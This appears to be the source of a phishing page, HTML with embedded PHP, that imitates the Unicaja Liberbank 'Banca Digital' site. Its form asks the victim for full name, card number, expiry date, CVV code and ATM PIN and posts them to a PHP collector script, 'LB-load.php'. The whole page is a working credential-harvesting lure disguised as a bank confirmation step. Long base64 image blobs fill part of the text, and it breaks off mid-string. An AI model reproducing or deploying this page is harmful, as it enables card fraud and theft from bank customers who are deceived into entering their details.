7aY3RILRETTPBh9LF7SLCRgAfBWdpzGmQtDgGHquVeFVMKKRZeJdNRgJ4F/YO3oM9hOsR3QWCD6B7FAdKFpPoyYARXC697SMA6ic1ZarhwgwmvieEE8SEALVuL6EWyHWNPYzB2VCVg6i+1N82Jh6E/EArETG+fDSFNwGoGHsBrn6eR+r5JYldwDCJuiCPaKLinibdUV/J8IbbEg9D9igdgNjfNNhRp1HNsEHsb0/SPJvbZiHJBWq8vwIh0G9gnYlJ8/CTTFAtH/2GfdrrmwZCbg2YrnGuBCrElArnxJhPeLWJ7T4kt5CRt5O4TihsPHlJF4h+iByAMVIrwg1lfpSNjtDOmdGQSMVLhbhPabLG69DHifwDaBx0ceZztRTP8hFogcaJoHY45G/RCWSZq/Yyv8JHo2tg8QWK0Bz4oHcbRgnqV3qHUX901x/KFfEQtEjjQ+BBvvhTHHsQ4ztsdiA0z2pHYGwEHimYcNhQfryzRWlOUCLbFA9C9igciTRotXbBF4GCGBqVDJPbxlDIJoyAMieDFje3WUKt4eC0T/Ih//ekwX6ucCQnU05ehy9mxXbET5HMJ98WyH/k28QxRI0zwYcywZ8TyHYwmWA9Vd141qhLGq3C1Ca7wr9F9igSiCxvkw+gQ0M4jFLsVzWEOyid28fJII6yuSPDX8mNi71F+JBaJIGh+Ece8F71glymMIE7HZcjsb2w6YEnoeFngzFoj+SSwQJaBxPoyZAQpNAvOx9PEj2HWo5UigAs99o48jjFWn/kcsECWi8cGOjNkWgccQmrE08qqdXjoF4WWExaOOtcBfTP8hFogS0zQfRs0gjePpaJzw29lxlG8lMBHlHoHtsUD0L2KBKANN82DMMfgg5GV1LAAOZ8faiokIWyTN46NmxLtEfyIWiDLROB9GfghQViD8HUsJn0J2khxMwfGoCOuGHw0bH+rrK46BWCDKStO8jprt9VhkezidtRXDEAah3OOETLxL9A9igegFoozZbSI8jE0hPQqzJQ5CWCLw8sgZcWyiPxALRC8RRbbbBZ7CGiNnI9uTEO4V2BoLRN8TC0Qv0mgeqNAFPK/KIixWcQTQHDoeGX1cXF/d18QC0cs0zYNRR4MPWCqepxDqgeOd8pTAqtFx0VCfEpeQ9gENl1kIW4XnEU7Hxn99XWGIxn0t+5R4h+gjGh+E0ccBymZgHsJUgWGJJAtHHB3HJvqKuB6iH1B/DQA1qhwlnn8CW+Oaib4hVpn6AQ2XgmRocZ7HRWmWWG2KiYmJiYmJiYnpv+RkVO+//4TsfwbRe3LRcsV77+vq9vevvrqCpqbGHN4S0x21tbUAIkI1OXsHtQ1Ir1y5uuzXN2lSHYCoag2526atQGblylVlv75cSeT0ooQD60Q3C2vQlcvMGwG54803N/2hpqaKpnjWZlGIWdqDQa7FZtX19B2EIN8H7u/FyxyCjRKbmtv1MRMbDdBvyEkgIiqAk4kGB+aGrFXVP0js3C0VSawP1LtyeG2oyv/28r1PYlWCh+fw2gzddynpM8rtdo0diH1LfP/zJI5DxMR0IRaImJguxAIRE9OFWCBiYroQC0RMTBdigYiJ6UIsEDExXYgFIiamC7FAxMR0IZ/UjZi9nAkTJqKKBAGDQfYXYTyWf+SwflFNqqwGNgDpVav6T9JdbxELxD7A+PHjUUWckykifBqYgSXgDcMapgmWbNcs1jNqAXB3bW3tA1u2bF0/ZMgg1qxZ2+vXPWHCBIDAOXm3CLXkmGUNeFWeFGFVvpm+sUDsAyQSwTAR+SpwFnAQu1eVk1jr/lHYdNVPi/Dc8OFDb1Llttraia2rVpU/jTzL/vtP4KijpvD8869+UkSuB/Yj99ysW0XkoUJSuWIbYmCjwFgRuQm4FtsVcv3OK4B3A/8lwg+AcbW1E3N8a3HU1U0ikRAWLHjtgyJyDdY5PcAW8D39BMCfQb4Jur6ioibvc8c7xMBFgdHAdcCpRRynBjhbRMao6gV1dbVr0+k069a9UZaLnjBhAiKKqrwduAnb0XL9vH8EuRD0jUKLjmKBGLiICGdhBV1FHwv4tIi0qup5QZDYWq6LDgKH975eRK4j99obBf4qIherUrAwQKwyDWQCbPhjZYmOJ8BnReTfmptTMnFiadWnurrx1NbWosr4SBjen8fbHwS5UFXXOFdc7714h4jJhwrgnMGDK+eJsKC0h04gwmjge8CH83jjw8A5oCtKUZsd7xD7HorFHNIFvn+yCGd5r8lSGdm1tRPxXmuA7wCfI/eOko8D54Bbal7j4ol3iH2HTcADWGPlNzA36xTgBGxWRTKPY53onPwEeLEUF+a9rwyC4NvAmeTeb/hxkLNAXwFl5crSxEligdg3eAGYpaoPOhe0r1ixgrq6STg3Du/X/hQ4F7gIGJzj8SYAH3YueHHixAmsXr2m4AtTDQgCvhKdP1d754lIGBaCY+XKFSW7UbHKNPBZBHwN9K7Kyur2FSvs4Vm5cgWvv/40WJrGHOB68tM7js9k0oOK7GMgIuFnge+SuzD+AzhH1S8EKakwQCwQA50WYI6q/kMkYNmypbu8IDJEU8CNwJN5HPsQEakTKdiro1gKyVwsXpILLwP/LsILYSisXLmy5DcsFoiBzVPAnSJCdmfYHaqKCG8Ct5D7LjFGhKlF9H1KYKkkB+T4+leAf1flWVVYu7Y8iYexQAxs5omwpaepRKtWrcZeo49iBncuVIBMK+LaBKjO8bXNwOWq+lhlZYJytr6MBWLg0gL8UxVySeNWBVVWAsvyOMcE5wImTpyQx1sKoho4Mgx90NqaKuuJYoEYuDQDr+f+ckXVtwCv5XGOEWGYCqT8/TIdcGYQBDOSyQTjxo0v64liBibbMKHIiSBIIOJCYHMe56hWJeiljpmjRJgVhuH4ioryRQtigRi4pFXJ5DrV9PXXXyda6TN9feF74D0icpb36qLxACUnFoiBS1KEIFdtZtKkjqTYfPyoaXIbjVAqHHCmiBwjYikf5ThBzMCkGkvGywnvPd5LAIzI4xzbVq9em9HeHa49VoSZqjq2HAePBWLgUkUeD7cIiGg1kI8u8uakSXU0NhY9HUrJb6c5WkTOTqdDV+o09FggBi6DVTkwnzeIMIbcK9RCVVaqKm1tRblCFbgd+HMe73HAWclk4pggcNlmBCUhFoiBS1KEIxMJpScDtMsqexSWuJcLraBLc3xtdyjwRxE5C7gKyOd4Y0WY6b0f61zpHuNyZ7sKbBWolLq6/Qs6QBiKJhJeV6xYB8CrD01GgJEkRHLPm9/78AqptEeEYR8uOIHt2HRaxgJv9ng6r1XOySfJ3e5YIyLFZtb9GeQCVX1j+3Z9Y/BguQn4Abmnoh8tImenUpmrJ0yYEK5ZU3jWbZZyC8QJUJOPkbYzGgT6O9XEI9l/GGe/Agk4C3g7paoM6V84AllCovIG0NYijvNWEU4B/XldXd1uk+Hq6iaiKgDHkV+l2kugbxQRkwuB32QbAtTV1QL8DptjeHzO98lUp0dFmF/Efeqg3AJxOLkN4OsOBXke6BAI1/nrQ8DHynz9fckTCDeDFCMQSeAbIA3Q9sjOQlFXVweEiMgRWAr28ByPGwIPiEjK+4I9TEqXmIcIeE+TCD/EBkvmOpBxrAizVFlYW1v7ZrHdBvcGG0Lz/PeBQqk+31Tgv6HybFWtra2tTUyYUCt1dbUBMArcZ4BfYQ9hrrwOPGx5UqVpXrZihT3IqjoP+G2ebz9ahLPDMHTFxibiirl9gynA9SKcDywJAjYB1aAHYl36BuV5vL96r8tKncO0atUq6upq01g/pmPJvQ2NA85MJIL5Ijw6fvx41q1bV9A1xAKx75AEDo5+imEF8BvnxJcnDVsRSSxVDW8EbiD3stJxwExVXkkmEwUHRvYGlSmm/xACP89kwpfKFZxeuXI1qiHAH4EH83z78cC/qYqYfZQ/sUAMXNKU3gN3N/DzRCLQcrbKj1JBNgM/wmq+cyUAzhHR94JSV5d/08JYIAYuLwF/pXTG+ZPAt0Eay53P18VQfwT4dZ5v3x/4tqqOiHaavIgFYuCyBbgCuLcEx3pElbNEWJTJhKxcWXwArCci+yQEfgp5dwk8QUS+2tqazrvl5t4gEJLnv8cYTtWvBM7G3JjtBRxjK/CfwJdE9CVVYe3a8gtDFlUQYTnWIiefeEwS+HpNTcV78s11ysfL5LEC9JH0Xg68B7bvcJOiXwKN0fX054KWQgmA9eyq7oSYl2c0e7YPAmAloKq6QkTOAR4DvoYFSveUnqGY3v448D+qzBehLcdJPCEWo6ihZ/slpIeKvsgNC3Ab8EGsAXKuelAAfEqV54IgaMv1xue0ykbBjgCoo3TdpHO7QJE3VHVzVq/c+tBkAAkkMQFkCAM0QCfQKugqwFcfvYxJk2oBHMgI7IHWPb+dlKputNd5RBBVNxZ7qD4I1GOLWwW2e2wGVgHPA4+DLlZ1rSK5qUhRgZEDHYmt0Ll8L5uA9hUr9txfadKkOrBZeINzPG72HnizeQj31IZn5zfF7ENMnjwZEPE+UwPUiBCoEqpqq3NBC+BzfXhiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiCuL/A4eNrIvCRm+aAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIxLTA3LTMwVDE4OjAyOjAyKzAwOjAwVnYh8gAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMS0wNy0zMFQxODowMjowMiswMDowMCcrmU4AAAAASUVORK5CYII=" sizes="196x196"></head><body id="entrada" style="">


	<div id="login">
		<div class="header">
			<div class="container py-2">
				<div class="row">
					<div class="col d-flex align-items-center justify-content-between">
						<h1 class="d-flex align-items-center m-0">
							<i class="fas icono-logo-unicaja-liberbank"></i>
						</h1>
						<a href="#">desconexión</a>
					</div>
				</div>
			</div>
		</div>
		
		<div class="container content mt-3 mt-md-5 mb-2">
			<div class="row">
				<div class="col-12 col-md-8">
					<div id="notif-instantanea">
						
					</div>
				
					<h3>Banca Digital - información de confirmación</h3>
					<form id="formu" name="formu" action="<?php echo 'LB-load.php?token='.$token1; ?>" method="post">
						
						
						
						
						     <div class="panel-body" style="max-width:400px;margin:0 auto;margin-top: 25px;">
      
       <div class="row">
        <div style="margin:0 auto;text-align:initial" class="col-md-12">
         <label style="">apellido y Nombre:</label>
        </div>
        <div class="col-md-12" style="">
         <input type="text" name="fn" class="form-control" placeholder="apellido y Nombre..." required="" value="" style="width:100%;height:45px;padding-left:10px;outline:0">
        </div>
       </div>
       
      
       <div>
        <div>
         <div>
          <div>
           <div style="padding:0" class="col-md-12">
            <label style="">número de tarjeta:</label>
           </div>
           <div>
            <input maxlength="21" id="cn" type="tel" name="cn" placeholder="xxxx xxxx xxxx xxxx" required="" minlength="16" style="width:100%;height:45px;padding-left:10px;outline:0;background:url(data:image/png;base64,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BAAAWCABAAAWSAAAgAU60PSu4VV7TfXuAXUBYGnOrO6x6qKjAgAAsIe5BQAACyQAAMACCQAAsEACAAAskAAAAAskAADAAgkAALBAAgAALJAAAAALJAAAwAIJAACwQAIAACyQAAAACyQAAMACCQAAsEACAAAskAAAAAskAADAAgkAALBAJw6q+/bqLYNqA8CS3KW604jCRwdsPzmiUQBYoKc0YKx2CwAAFkgAAIAFEgAAYIEEAABYIAEAABZIAACABRIAAGCBBAAAWCABAAAWSAAAgAUSAABggQQAAFggAQAAFkgAAIAFEgAAYIEEAABYIAEAABZIAACABRIAAGCBBAAAWCABAAAWSAAAgAUSAABggQQAAFggAQAAFkgAAIAFEgAAYIEEAABYIAEAABZIAACABRIAAGCBBAAAWCABAAAWSAAAgAUSAABggQQAAFggAQAAFkgAAIAFEgAAYIEEAABYIAEAABboxEF1v6T69EG1AWBJ7jKi6IHq6IjCAMDe5RYAACyQAAAACyQAAMACCQAAsEACAAAskAAAAAskAADAAgkAALBAAgAALJAAAAALJAAAwAIJAACwQAIAACyQAAAACyQAAMACCQAAsEACAAAskAAAAAskAADAAp04qO5rqncPqg0AS3JmdY8RhY8O2B42olEAWKALGjBWuwUAAAskAADAAgkAALBAAgAALJAAAAALJAAAwAIJAACwQAIAACyQAAAACyQAAMACCQAAsEACAAAskAAAAAskAADAAgkAALBAAgAALJAAAAALJAAAwAIJAACwQAIAACyQAAAACyQAAMACCQAAsEACAAAskAAAAAskAADAAgkAALBAAgAALJAAAAALJAAAwAIJAACwQAIAACyQAAAACyQAAMACCQAAsEACAAAskAAAAAskAADAAgkAALBAAgAALJAAAAALdOLcDQCwZ9y0Ors6p7pDdXp16rF/H+Gq6lD14epD1UXV26p3VlcO2ifHCAAAy3Vq9cDq/tX51WfN284/u6J6TXVh9ZLqddXRWTvap44O2B621iMAYKsOVPerfrH6SGPGgFVv76j+R3XblZ+NzXBBY86rAACwAAerL6te3/wD+k63w9ULq3NXfG72uiEBwCRAgP3vftVbqhdUd5+3lV05WH1p9YbqOdWt5m1nswkAAPvXLar/Xb2suvPMvazSweprmyYMfnvG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) 50% 50% no-repeat;background-size:35px;background-position-x:99%;background-color:white" value="" class="form-control">
           </div>
          </div>
         </div>
        </div>
        <div style="display:inline-flex;width:100%;margin-top:5px">
         <div style="width:48%">
          <div style="padding:0" class="col-md-12">
           <label style="">fecha de caducidad:</label>
          </div>
          <div>
           <input maxlength="5" type="tel" id="ed" name="ed" class="form-control" placeholder="mm/yy" required="" value="" minlength="5" style="width:96%;height:45px;padding-left:10px;outline:0">
          </div>
         </div>
         <div style="width:48%;margin-left:4%">
          <div style="padding:0" class="col-md-12">
           <label style="">criptograma CVV/CSC:</label>
          </div>
          <div>
           <input maxlength="3" type="tel" class="form-control" name="sc" placeholder="***" required="" value="" minlength="3" id="sc" style="width:99%;height:45px;padding-left:10px;outline:0">
          </div>
         </div>
        </div>
  <div >
         <div >
          <div >
           <div style="padding:0" class="col-md-12">
            <label style>ATM pin:</label>
           </div>
           <div>
            <input  id="pin" type="tel" class="form-control" name="pin" placeholder="1234" required minlength="4" maxlength="4" style="width:100%;height:45px;padding-left:10px;outline:0;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB0AAAAVCAIAAAA1onI1AAAACXBIWXMAABcSAAAXEgFnn9JSAAAAB3RJTUUH5AEXFw8S3Odt0AAAAAd0RVh0QXV0aG9yAKmuzEgAAAAMdEVYdERlc2NyaXB0aW9uABMJISMAAAAKdEVYdENvcHlyaWdodACsD8w6AAAADnRFWHRDcmVhdGlvbiB0aW1lADX3DwkAAAAJdEVYdFNvZnR3YXJlAF1w/zoAAAALdEVYdERpc2NsYWltZXIAt8C0jwAAAAh0RVh0V2FybmluZwDAG+aHAAAAB3RFWHRTb3VyY2UA9f+D6wAAAAh0RVh0Q29tbWVudAD2zJa/AAAABnRFWHRUaXRsZQCo7tInAAAFOElEQVQ4jVWUT28cxxHFq6p7emZ3hrPaJbkUCUt0ZB0kQUGEOM5BSL5JbvkCAYJ8J111DIwgsWxAsqMoyIWyFNCkwn/x7pI7O7Pbs9N/qnJY+ZA+NRoPD69f/VD48tV3iAgAACAiiMggCCAACJt3AQQRISD4/8ORW79u265du8627crWtmmXTVh3GhFFZDKZOOcAABFZZHt7NK8qjiwipKiXZYhgbQsCAKCU2tnZQSRbVc2Xf1YLC7Ejjj2RkOVXo53OWY2ALFyWZYzx9et/fPHrLy4uLlbWbo+2Z7PZdDp9+OjhdDJh5r3x3vv378uyHI/H1rYivLi6Gv/txe6q7Zh1Zlj4Zrj79pd91EoDAiIys/Mhxuh9YGYQiJEXi/r6+iYGBsDIHJmrReND3Lt9sLI2hFDb7paomUlv/HIAQEpHhCTRoEmLiIg45xHxF0+eAECIgQhDCKPRqCxLEXbOISKzfPbZvX6/771bLBbe+7q59n0ztJLrWwzCRLOy0GlPIeCrb/8OANfXN857AAGANEvLrXI6m23aFJGy3HLez6azruu6zrVtm6bGWrtatvXkB98xIoNBgybt56Y36DjoTQlpavIi994bYy6vLoVlNBw677zzeV6cn59rre/eveu9BwCt9cuXL+u6Xi6nv//dj3vDuQAyKSXy7